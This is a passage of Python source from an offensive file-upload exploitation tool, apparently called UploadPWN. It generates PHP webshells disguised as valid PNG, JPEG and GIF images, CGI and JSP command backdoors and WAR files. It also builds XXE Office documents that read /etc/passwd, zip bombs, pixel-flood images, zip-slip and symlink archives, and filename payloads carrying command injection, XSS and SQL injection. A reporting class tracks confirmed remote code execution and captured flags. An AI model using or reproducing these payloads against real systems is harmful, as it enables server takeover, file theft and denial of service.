    "script": b"<html><body><script>alert(document.domain)</script></body></html>",
    "img_onerror": b'<html><body><img src=x onerror="alert(document.domain)"></body></html>',
    "svg_onload": b'<html><body><svg onload="alert(document.domain)"></svg></body></html>',
}

# -- CGI script payloads --
CGI_PAYLOADS = {
    "perl": b'#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";\nprint `$ENV{QUERY_STRING}`;\n',
    "python": b'#!/usr/bin/python3\nimport os,cgi\nfs=cgi.FieldStorage()\nprint("Content-type: text/html\\n")\nos.system(fs.getvalue("cmd","id"))\n',
    "bash": b'#!/bin/bash\necho "Content-type: text/html"\necho ""\neval "$QUERY_STRING"\n',
}

# -- Path traversal filenames --
def gen_path_traversal_filenames(shell_ext=".php"):
    """Generate filenames with path traversal sequences."""
    return [
        f"../shell{shell_ext}",
        f"../../shell{shell_ext}",
        f"../../../shell{shell_ext}",
        f"..\\shell{shell_ext}",
        f"..\\..\\shell{shell_ext}",
        f"....//shell{shell_ext}",
        f"....\\\\shell{shell_ext}",
        f"..%2fshell{shell_ext}",
        f"..%5cshell{shell_ext}",
        f"%2e%2e%2fshell{shell_ext}",
        f"%2e%2e/shell{shell_ext}",
        f"..%252fshell{shell_ext}",  # double URL-encode
        f"..%c0%afshell{shell_ext}",  # overlong UTF-8 for /
        f"..%ef%bc%8fshell{shell_ext}",  # fullwidth /
        f"../../../var/www/html/shell{shell_ext}",
        f"../../../var/www/shell{shell_ext}",
        f"..\\..\\..\\inetpub\\wwwroot\\shell{shell_ext}",
    ]

# -- Unicode normalization filenames --
def gen_unicode_filenames(base="shell"):
    """Generate filenames using Unicode chars that may normalize to ASCII equivalents."""
    return [
        # Fullwidth characters (U+FF01-FF5E normalize to ASCII)
        f"{base}\uff0ephp",           # fullwidth . → .
        f"{base}.\uff50\uff48\uff50", # fullwidth php
        f"{base}.\u1d29hp",           # small capital P
        f"{base}.ph\u1d29",           # small capital P at end
        # Mixed case with Unicode
        f"{base}.P\u0048P",           # Latin capital H
        f"{base}.p\u029Cp",           # turned h
        # Homoglyphs
        f"{base}.\u0440hp",           # Cyrillic р looks like p
        f"{base}.p\u04BBp",           # Cyrillic h
        f"{base}.ph\u0440",           # Cyrillic р at end
        # With combining characters
        f"{base}.php\u200b",          # zero-width space after
        f"{base}.php\u200c",          # zero-width non-joiner
        f"{base}.php\ufeff",          # BOM at end
        f"{base}.\u2024php",          # one dot leader
    ]

# ═══════════════════════════════════════════════════════════════════════════════
#  NEW PAYLOAD GENERATORS — v7.0
# ═══════════════════════════════════════════════════════════════════════════════

def make_exif_xss_jpeg(xss_payload=b'"><img src=x onerror=alert(document.domain)>'):
    """Create a valid JPEG with XSS payload in EXIF Comment + UserComment fields."""
    data = b"\xff\xd8"  # SOI
    # APP0 JFIF
    jfif = b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    data += b"\xff\xe0" + struct.pack(">H", len(jfif) + 2) + jfif
    # APP1 EXIF — embed XSS in UserComment
    exif_header = b"Exif\x00\x00"
    # TIFF header (little-endian)
    tiff = b"II\x2a\x00\x08\x00\x00\x00"  # offset to first IFD = 8
    # IFD with one entry: ImageDescription (tag 0x010E)
    ifd_count = struct.pack("<H", 1)
    # Tag 0x010E, type ASCII (2), count, offset
    desc_data = xss_payload + b"\x00"
    ifd_entry = struct.pack("<HHI", 0x010E, 2, len(desc_data))
    if len(desc_data) <= 4:
        ifd_entry += desc_data.ljust(4, b"\x00")
    else:
        ifd_entry += struct.pack("<I", 26)  # offset after IFD
    ifd_next = b"\x00\x00\x00\x00"  # no next IFD
    exif_data = exif_header + tiff + ifd_count + ifd_entry + ifd_next
    if len(desc_data) > 4:
        exif_data += desc_data
    data += b"\xff\xe1" + struct.pack(">H", len(exif_data) + 2) + exif_data
    # COM marker with XSS too
    data += b"\xff\xfe" + struct.pack(">H", len(xss_payload) + 2) + xss_payload
    # Minimal image data
    dqt = b"\xff\xdb\x00\x43\x00" + bytes(range(64))
    data += dqt
    sof = b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
    data += sof
    dht = b"\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b"
    data += dht
    sos = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40"
    data += sos
    data += b"\xff\xd9"  # EOI
    return data


def make_docx_xxe(filepath="/etc/passwd"):
    """Create a DOCX (ZIP) with XXE entity in [Content_Types].xml."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml with XXE
        zf.writestr("[Content_Types].xml", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>""")
        # _rels/.rels
        zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>""")
        # word/document.xml with entity reference
        zf.writestr("word/document.xml", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>""")
        # word/_rels/document.xml.rels
        zf.writestr("word/_rels/document.xml.rels", """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>""")
    buf.seek(0)
    return buf.read()


def make_xlsx_xxe(filepath="/etc/passwd"):
    """Create an XLSX (ZIP) with XXE entity in xl/sharedStrings.xml."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
</Types>""")
        zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>""")
        zf.writestr("xl/sharedStrings.xml", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{filepath}">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<si><t>&xxe;</t></si>
</sst>""")
        zf.writestr("xl/workbook.xml", """<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
</workbook>""")
    buf.seek(0)
    return buf.read()


def make_zip_bomb(levels=5, base_size=10*1024*1024):
    """Create a nested zip bomb. Small file that expands to massive size."""
    # Start with compressible data
    data = b"\x00" * base_size
    for _ in range(levels):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", data)
        buf.seek(0)
        data = buf.read()
    return data


def make_pixel_flood_png(width=0xFFFF, height=0xFFFF):
    """
    Create a valid PNG with huge declared dimensions but minimal actual data.
    Causes memory exhaustion when server tries to resize/process.
    """
    sig = b"\x89PNG\r\n\x1a\n"
    # IHDR with huge dimensions
    ihdr_data = struct.pack(">II", width, height) + b"\x08\x02\x00\x00\x00"
    ihdr = struct.pack(">I", len(ihdr_data)) + b"IHDR" + ihdr_data
    ihdr += struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    # Minimal IDAT — just one row
    raw = b"\x00" + b"\x00" * (min(width, 1) * 3)
    compressed = zlib.compress(raw)
    idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed
    idat += struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
    # IEND
    iend = struct.pack(">I", 0) + b"IEND"
    iend += struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    return sig + ihdr + idat + iend


def gen_filename_injection_payloads(base="shell"):
    """Generate filenames with OS command injection, XSS, and SQLi payloads."""
    payloads = {
        "cmd_injection": [
            f"{base}$(whoami).jpg",
            f"{base}`id`.jpg",
            f"{base};id;.jpg",
            f"{base}|id.jpg",
            f"{base}||id||.jpg",
            f"{base}&whoami&.jpg",
            f"{base}%0aid.jpg",
            f"{base}\nid\n.jpg",
            f"$(cat /etc/passwd).jpg",
            f"`cat /etc/passwd`.jpg",
        ],
        "xss": [
            '<script>alert(1)</script>.jpg',
            '"><img src=x onerror=alert(1)>.jpg',
            "test'onmouseover='alert(1).jpg",
            '<svg onload=alert(1)>.jpg',
            '"><svg/onload=alert(document.domain)>.jpg',
            "test.jpg<script>alert(1)</script>",
        ],
        "sqli": [
            "test' OR '1'='1.jpg",
            "test'; SELECT sleep(5);--.jpg",
            'test" UNION SELECT 1--.jpg',
            "test'; DROP TABLE uploads;--.jpg",
            "test' AND 1=1--.jpg",
            "test\\' OR 1=1--.jpg",
        ],
    }
    return payloads


# ═══════════════════════════════════════════════════════════════════════════════
#  PNG IDAT CHUNK POLYGLOT — Real valid PNG with PHP in IDAT
# ═══════════════════════════════════════════════════════════════════════════════

def _png_chunk(chunk_type, data):
    """Build a proper PNG chunk with CRC."""
    chunk = chunk_type + data
    return struct.pack(">I", len(data)) + chunk + struct.pack(">I", zlib.crc32(chunk) & 0xFFFFFFFF)

def make_png_text_shell(php_code=b"<?php system($_GET['cmd']); ?>"):
    """
    Create a valid PNG with PHP in tEXt chunk. Passes mime_content_type() as image/png.
    Simpler than IDAT polyglot but works when Apache processes .phar.png via mod_mime.
    """
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">II", 1, 1) + b"\x08\x02\x00\x00\x00"
    ihdr = _png_chunk(b"IHDR", ihdr_data)
    raw_data = b"\x00\x00\x00\x00"  # filter byte + 1 RGB pixel
    idat = _png_chunk(b"IDAT", zlib.compress(raw_data))
    text = _png_chunk(b"tEXt", b"Comment\x00" + php_code)
    iend = _png_chunk(b"IEND", b"")
    return sig + ihdr + idat + text + iend


def make_jpeg_text_shell(php_code=b"<?php system($_GET['cmd']); ?>"):
    """
    Create a minimal valid JPEG with PHP in COM (comment) marker.
    Passes mime_content_type() as image/jpeg.
    """
    # JPEG SOI + APP0 (JFIF) header
    soi = b"\xff\xd8"
    # APP0 marker (JFIF)
    app0 = b"\xff\xe0"
    app0_data = b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    # COM marker with PHP
    com = b"\xff\xfe"
    com_len = struct.pack(">H", len(php_code) + 2)
    # Minimal SOS + EOI
    # DQT (quantization table) - minimal
    dqt = b"\xff\xdb\x00\x43\x00" + bytes(range(1, 65))
    # SOF0 (1x1 pixel, 1 component)
    sof = b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
    # DHT (Huffman table) - minimal DC table
    dht = b"\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b"
    # SOS
    sos = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40"
    eoi = b"\xff\xd9"

    return soi + app0 + app0_data + com + com_len + php_code + dqt + sof + dht + sos + eoi


def make_png_idat_polyglot(php_code=b"<?=`$_GET[0]`?>"):
    """
    Create a structurally valid PNG with PHP code embedded in the IDAT chunk.
    This passes real image validators (getimagesize, finfo, etc).
    The PHP code is embedded inside a valid zlib stream within IDAT.
    """
    # PNG signature
    sig = b"\x89PNG\r\n\x1a\n"

    # IHDR: 1x1 pixel, 8-bit RGB
    width = struct.pack(">I", 32)
    height = struct.pack(">I", 32)
    ihdr_data = width + height + b"\x08\x02\x00\x00\x00"  # 8bit RGB, deflate, filter none, no interlace
    ihdr = _png_chunk(b"IHDR", ihdr_data)

    # Build raw image data: 32 rows, each starting with filter byte 0
    # We embed PHP in the raw pixel data as comment-safe bytes
    raw_rows = b""
    php_padded = php_code + b"\x00" * (32 * 3 - len(php_code)) if len(php_code) < 32 * 3 else php_code[:32*3]
    for y in range(32):
        raw_rows += b"\x00"  # filter byte: None
        if y == 0:
            raw_rows += php_padded[:32*3]
        else:
            raw_rows += b"\x00" * (32 * 3)

    # Compress with zlib for IDAT
    compressed = zlib.compress(raw_rows)
    idat = _png_chunk(b"IDAT", compressed)

    # tEXt chunk with PHP payload as comment (some parsers expose this)
    text_data = b"Comment\x00" + php_code
    text = _png_chunk(b"tEXt", text_data)

    # IEND
    iend = _png_chunk(b"IEND", b"")

    return sig + ihdr + text + idat + iend


def make_png_idat_raw_polyglot(php_code=b"<?=`$_GET[0]`?>"):
    """
    Alternative: Create PNG where the PHP code survives recompression.
    Uses a technique where PHP is embedded in pixel values that compress
    to include the PHP code in the deflated stream.
    """
    # For maximum compatibility, we create a valid PNG with PHP in a tEXt chunk
    # AND prepended after IEND (some servers serve raw file content)
    base = make_png_idat_polyglot(php_code)
    return base + b"\n" + php_code


# ═══════════════════════════════════════════════════════════════════════════════
#  JPEG POLYGLOT
# ═══════════════════════════════════════════════════════════════════════════════

def make_jpeg_polyglot(php_code=b"<?=`$_GET[0]`?>"):
    """Create a valid JPEG with PHP in EXIF comment that passes validators."""
    # SOI
    data = b"\xff\xd8"
    # APP0 JFIF marker
    app0 = b"\xff\xe0"
    jfif = b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    data += app0 + struct.pack(">H", len(jfif) + 2) + jfif
    # COM (comment) marker with PHP payload
    com = b"\xff\xfe"
    data += com + struct.pack(">H", len(php_code) + 2) + php_code
    # Minimal SOS + image data + EOI
    # DQT (quantization table)
    dqt = b"\xff\xdb\x00\x43\x00" + bytes(range(64))
    data += dqt
    # SOF0 (Start of Frame, baseline, 1x1, 1 component)
    sof = b"\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00"
    data += sof
    # DHT (Huffman table - minimal)
    dht = b"\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b"
    data += dht
    # SOS
    sos = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00\x7b\x40"
    data += sos
    # EOI
    data += b"\xff\xd9"
    return data


# ═══════════════════════════════════════════════════════════════════════════════
#  GIF POLYGLOT
# ═══════════════════════════════════════════════════════════════════════════════

def make_gif_polyglot(php_code=b"<?=`$_GET[0]`?>"):
    """Create a valid GIF89a with PHP in comment extension."""
    data = b"GIF89a"
    # Logical screen descriptor: 1x1, no GCT
    data += b"\x01\x00\x01\x00\x00\x00\x00"
    # Comment extension with PHP
    data += b"\x21\xfe"  # comment extension
    # Split PHP into 255-byte sub-blocks
    code = php_code
    while code:
        block = code[:255]
        data += bytes([len(block)]) + block
        code = code[255:]
    data += b"\x00"  # block terminator
    # Minimal image data
    data += b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00"
    # Trailer
    data += b"\x3b"
    return data


# ═══════════════════════════════════════════════════════════════════════════════
#  WAR FILE GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def make_war_file(shell_content=None, shell_name="cmd", cmd_param="cmd"):
    """Generate a .war file with a JSP webshell for Tomcat/JBoss deployment."""
    if shell_content is None:
        shell_content = SHELLS_JSP["jsp_runtime"]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(f"{shell_name}.jsp", shell_content)
        zf.writestr("WEB-INF/web.xml", f"""<?xml version="1.0"?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee" version="2.4">
  <display-name>{shell_name}</display-name>
</web-app>""")
    buf.seek(0)
    return buf.read()


# ═══════════════════════════════════════════════════════════════════════════════
#  SYMLINK ZIP GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def make_symlink_zip(target_file="/etc/passwd", link_name="symlink.txt"):
    """
    Create a zip containing a symlink pointing to target_file.
    When extracted by a vulnerable server, reads arbitrary files.
    """
    buf = io.BytesIO()
    # We need to craft the zip manually for symlinks
    # Symlink is indicated by external_attr having the symlink flag
    # and the file content being the target path
    zinfo = zipfile.ZipInfo(link_name)
    # Unix symlink: file mode 0o120777 in the upper 16 bits of external_attr
    zinfo.external_attr = 0xA1ED0000  # symlink with permissions
    zinfo.create_system = 3  # Unix
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr(zinfo, target_file)
    buf.seek(0)
    return buf.read()


# ═══════════════════════════════════════════════════════════════════════════════
#  ZIP SLIP GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def make_zipslip(targets=None, shell_content=None):
    """Create a zip with path traversal entries."""
    if targets is None:
        targets = [
            "../../../var/www/html/shell.php",
            "../../html/shell.php",
            "../shell.php",
            "shell.php",
        ]
    if shell_content is None:
        shell_content = SHELLS_PHP["system"]
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for t in targets:
            zf.writestr(t, shell_content.decode() if isinstance(shell_content, bytes) else shell_content)
    buf.seek(0)
    return buf.read()


# ═══════════════════════════════════════════════════════════════════════════════
#  FILENAME GENERATOR — COMPREHENSIVE
# ═══════════════════════════════════════════════════════════════════════════════

def gen_filenames(server_type="all", base="shell"):
    """
    Generate all filename permutations for upload bypass.
    server_type: 'php', 'asp', 'jsp', 'cf', 'all'
    """
    names = []

    # Determine which extension sets to use
    exec_exts = []
    if server_type in ("php", "all"):
        exec_exts += PHP_EXTS
    if server_type in ("asp", "all"):
        exec_exts += ASP_EXTS
    if server_type in ("jsp", "all"):
        exec_exts += JSP_EXTS
    if server_type in ("cf", "all"):
        exec_exts += CF_EXTS

    # 1. Direct extension
    for ext in exec_exts:
        names.append(f"{base}{ext}")

    # 2. Double extension: shell.php.jpg and shell.jpg.php
    for exe in exec_exts:
        for img in IMG_EXTS:
            names.append(f"{base}{exe}{img}")
            names.append(f"{base}{img}{exe}")

    # 3. IIS semicolon trick (was missing) — shell.aspx;.jpg
    if server_type in ("asp", "all"):
        for exe in ASP_EXTS:
            for img in IMG_EXTS[:4]:
                names.append(f"{base}{exe};{img}")
                names.append(f"{base}{exe}%3b{img}")

    # 4. Null byte variants
    for exe in exec_exts:
        for img in [".jpg", ".png", ".gif"]:
            names.append(f"{base}{exe}%00{img}")      # URL-encoded null
            names.append(f"{base}{exe}\x00{img}")      # Raw null byte
            names.append(f"{base}{exe}%2500{img}")     # Double URL-encoded null

    # 5. Injection characters between extensions
    for exe in exec_exts[:10]:  # Top variants only to limit explosion
        for img in [".jpg", ".png", ".gif"]:
            for char in INJECT_CHARS:
                names.append(f"{base}{exe}{char}{img}")
                names.append(f"{base}{img}{char}{exe}")

    # 6. Trailing characters
    for exe in exec_exts:
        for trailer in [".", " ", "...", "::$DATA", "/", "\\",
                         "%20", "%00", "/.", "/./", " .", "....",
                         "::$DATA.jpg"]:
            names.append(f"{base}{exe}{trailer}")

    # 7. Trailing slash (was missing)
    for exe in exec_exts[:8]:
        names.append(f"{base}{exe}/")
        names.append(f"{base}{exe}/.")

    # 8. Path traversal prefixes
    for exe in exec_exts[:6]:
        for prefix in ["../", "../../", "../../../",
                        "..%2f", "....//", "..%5c",
                        "..%252f", "%2e%2e%2f", "%2e%2e/"]:
            names.append(f"{prefix}{base}{exe}")

    # 9. Dot-slash prefix (was missing)
    for exe in exec_exts[:6]:
        names.append(f"./{base}{exe}")
        names.append(f".\\{base}{exe}")

    # 10. Multiple dots (was missing)
    for exe in exec_exts[:6]:
        names.append(f"{base}{exe}....")
        names.append(f"{base}{exe}.....")
        names.append(f"{base}....{exe}")

    # 11. Unicode filenames (was missing)
    if server_type in ("php", "all"):
        # Unicode 'h' in php → p\u0068p
        names.append(f"{base}.p\u0068p")
        names.append(f"{base}.ph\u0070")
        names.append(f"{base}.%70%68%70")  # URL-encoded php
        names.append(f"{base}%2ephp")       # URL-encoded dot
        # Overlong UTF-8 for dot: \xc0\xae
        names.append(f"{base}\xc0\xaephp")

    # 12. Double URL encoding (was missing)
    for exe in exec_exts[:6]:
        for img in [".jpg", ".png"]:
            names.append(f"{base}{exe}%2500{img}")   # %25 = %, so %2500 = %00
            names.append(f"{base}%252e{exe[1:]}")     # %252e = %2e = .

    # 13. NTFS alternate data stream variants
    if server_type in ("asp", "all"):
        for exe in ASP_EXTS[:3]:
            names.append(f"{base}{exe}::$DATA")
            names.append(f"{base}{exe}::$DATA.jpg")
            names.append(f"{base}.jpg:{base}{exe}")

    # Deduplicate preserving order
    seen = set()
    unique = []
    for n in names:
        if n not in seen:
            seen.add(n)
            unique.append(n)
    return unique


def gen_error_filenames():
    """Generate filenames designed to trigger error messages that leak paths."""
    names = []
    # Windows reserved names
    for res in WIN_RESERVED:
        for ext in [".jpg", ".png", ".gif", ".php"]:
            names.append(f"{res}{ext}")
    # Extremely long filename
    names.append("A" * 256 + ".jpg")
    names.append("A" * 500 + ".php")
    # Null characters in various positions
    names.append("\x00.jpg")
    names.append("shell\x00\x00\x00.jpg")
    # Special characters
    names.append("shell<>.jpg")
    names.append('shell"test".jpg')
    names.append("shell|pipe.jpg")
    names.append("shell\ttab.jpg")
    # Empty filename
    names.append("")
    names.append(".")
    names.append("..")
    return names


# ═══════════════════════════════════════════════════════════════════════════════
#  DISCOVERY / REPORTING ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Discovery:
    def __init__(self, target, outfile="uploadpwn_report.json"):
        self.target = target
        self.outfile = outfile
        self.start_ts = datetime.now().isoformat()
        self.steps = []
        self.filters = {}
        self.rce = []
        self.flags = []
        self.sources = {}
        self.xxe_reads = {}
        self.suggestions = []
        self.uploaded_files = []      # Track what was uploaded successfully
        self.renamed_files = {}       # original -> server_renamed mapping
        self.disclosed_paths = []     # Paths leaked from errors
        self.server_info = {}         # Server fingerprint data
        self.vulns = []               # Confirmed vulnerabilities
        self._lock = threading.Lock()

    def log(self, category, status, detail, extra=None):
        with self._lock:
            entry = {"ts": datetime.now().isoformat(),
                     "category": category, "status": status, "detail": detail}
            if extra:
                entry["extra"] = extra
            self.steps.append(entry)
        color = G if status in ("found", "bypassed") else \
                R if status == "failed" else Y
        tag = {"found": "FOUND", "bypassed": "BYPASS",
               "failed": "FAIL", "info": "INFO"}.get(status, status.upper())
        p(color, tag, f"{DIM}{category}{W}: {detail}", 1)

    def filter_detected(self, name):
        self.filters[name] = "present"
        self.log("filter", "found", f"Filter detected: {name}")

    def filter_bypassed(self, name, method):
        self.filters[name] = "bypassed"
        self.log("filter", "bypassed", f"'{name}' bypassed via: {method}")

    def record_rce(self, filename, url, output, shell, ct):
        self.rce.append({"file": filename, "url": url,
                         "output": output[:500], "shell": shell, "ct": ct})
        self.log("RCE", "found", f"RCE via '{filename}' shell={shell}", {"url": url})

    def record_flag(self, flag):
        self.flags.append(flag)

    def record_source(self, fn, c):
        self.sources[fn] = c

    def record_xxe(self, fp, c):
        self.xxe_reads[fp] = c

    def record_upload(self, filename, server_name=None):
        self.uploaded_files.append(filename)
        if server_name and server_name != filename:
            self.renamed_files[filename] = server_name

    def record_path(self, path, source="error"):
        if path not in self.disclosed_paths:
            self.disclosed_paths.append(path)
            self.log("path_disclosure", "found", f"Path leaked ({source}): {path}")

    def record_vuln(self, vuln_type, detail, severity="HIGH"):
        self.vulns.append({"type": vuln_type, "detail": detail,
                           "severity": severity})

    def suggest(self, msg):
        self.suggestions.append(msg)

    def print_report(self):
        print(f"\n{C}{BOLD}{'═' * 72}")
        print(f"  UPLOADPWN REPORT — {self.target}")
        print(f"{'═' * 72}{W}")

        # Server info
        if self.server_info:
            print(f"\n{B}{BOLD}  SERVER FINGERPRINT:{W}")
            for k, v in self.server_info.items():
                print(f"    {DIM}{k:<20}{W}: {v}")

        # Filters
        print(f"\n{B}{BOLD}  FILTERS DETECTED:{W}")
        if self.filters:
            for name, status in self.filters.items():
                icon = f"{G}✓ BYPASSED{W}" if status == "bypassed" else f"{R}● ACTIVE{W}"
                print(f"    {icon}  {name}")
        else:
            print(f"    {DIM}No filters detected{W}")

        # Vulnerabilities
        if self.vulns:
            print(f"\n{R}{BOLD}  VULNERABILITIES:{W}")
            for v in self.vulns:
                sev_color = R if v["severity"] == "CRITICAL" else \
                            R if v["severity"] == "HIGH" else Y
                print(f"    {sev_color}[{v['severity']}]{W} {v['type']}: {v['detail']}")

        # RCE
        if self.rce:
            print(f"\n{M}{BOLD}  RCE CONFIRMED:{W}")
            for r in self.rce:
                print(f"    {G}✓{W} {r['file']}")
                print(f"       URL   : {r['url']}")
                print(f"       Shell : {r['shell']}  |  CT: {r['ct']}")
                print(f"       Output: {r['output'][:120]}")

        # Flags
        if self.flags:
            print(f"\n{Y}{BOLD}  FLAGS CAPTURED:{W}")
            for f in self.flags:
                print(f"    {Y}{BOLD}★ {f}{W}")

        # File reads
        if self.xxe_reads:
            print(f"\n{B}{BOLD}  FILES READ (XXE/LFI):{W}")
            for path, content in self.xxe_reads.items():
                print(f"    {G}✓{W} {path}: {content[:80]}...")

        # Source code
        if self.sources:
            print(f"\n{B}{BOLD}  SOURCE CODE READ:{W}")
            for fn in self.sources:
                print(f"    {G}✓{W} {fn} ({len(self.sources[fn])} bytes)")

        # Path disclosures
        if self.disclosed_paths:
            print(f"\n{Y}{BOLD}  DISCLOSED PATHS:{W}")
            for p_item in self.disclosed_paths:
                print(f"    {Y}→{W} {p_item}")

        # Renamed files
        if self.renamed_files:
            print(f"\n{B}{BOLD}  FILE RENAMES DETECTED:{W}")
            for orig, new in self.renamed_files.items():
                print(f"    {orig} → {G}{new}{W}")

        # Upload stats
        total_uploaded = len(self.uploaded_files)
        total_steps = len(self.steps)
        print(f"\n{B}{BOLD}  STATISTICS:{W}")
        print(f"    Steps executed  : {total_steps}")
        print(f"    Files uploaded  : {total_uploaded}")
        print(f"    RCE shells      : {len(self.rce)}")
        print(f"    Files read      : {len(self.xxe_reads)}")
        print(f"    Vulns found     : {len(self.vulns)}")

        # Suggestions
        if self.suggestions:
            print(f"\n{Y}{BOLD}  SUGGESTIONS:{W}")
            for s in self.suggestions:
                print(f"    → {s}")

        print(f"\n{DIM}  Report saved: {self.outfile}{W}")
        print(f"{C}{BOLD}{'═' * 72}{W}\n")

    def save(self):
        report = {
            "target": self.target,
            "start": self.start_ts,
            "end": datetime.now().isoformat(),
            "server_info": self.server_info,
            "filters": self.filters,
            "vulns": self.vulns,
            "rce": self.rce,
            "flags": self.flags,
            "sources": self.sources,
            "xxe_reads": self.xxe_reads,
            "disclosed_paths": self.disclosed_paths,
            "renamed_files": self.renamed_files,
            "uploaded_files": self.uploaded_files,
            "steps": self.steps,
            "suggestions": self.suggestions,
        }
        with open(self.outfile, "w") as f:
            json.dump(report, f, indent=2)


# ═══════════════════════════════════════════════════════════════════════════════
#  RESPONSE PARSER — Extract renamed filenames from upload responses
# ═══════════════════════════════════════════════════════════════════════════════

class ResponseParser:
    """
    Parses upload responses to extract:
    - Server-renamed filenames
    - Upload paths
    - Direct URLs to uploaded files
    - Error messages with path disclosure
    """

    # Patterns that commonly appear in upload success responses
    FILENAME_PATTERNS = [
        # JSON responses
        r'"(?:file_?name|name|file|filename|path|url|src|location|key)":\s*"([^"]+)"',
        r'"(?:uploaded|saved|stored)_?(?:file|name|path|as)":\s*"([^"]+)"',
        r'"(?:data|result|response)":\s*\{[^}]*"(?:name|file|path|url)":\s*"([^"]+)"',
        # HTML responses
        r'(?:src|href|data-src|action)=["\']([^"\']*(?:upload|file|image|media|avatar)[^"\']*)["\']',
        # Plain text
        r'(?:saved|uploaded|stored|moved|renamed)\s+(?:to|as|file)?\s*:?\s*["\']?([^\s"\'<>]+\.\w{2,5})',
        # Path disclosure in success messages
        r'(?:/[\w.-]+){2,}/[\w.-]+\.\w{2,5}',
        # URL in response
        r'(?:https?://[^\s"\'<>]+/[\w.-]+\.\w{2,5})',
    ]

    PATH_PATTERNS = [
        r'(?:/(?:var|home|srv|opt|usr|www|tmp|app)(?:/[\w.-]+)+)',
        r'(?:[A-Z]:\\(?:[\w.-]+\\)+[\w.-]+)',
        r'(?:/[\w.-]+){3,}/[\w.-]+\.\w{2,5}',
    ]

    ERROR_PATH_PATTERNS = [
        r'in\s+(?:<b>)?(/[^\s<:]+?)(?:</b>)?\s+on\s+line',
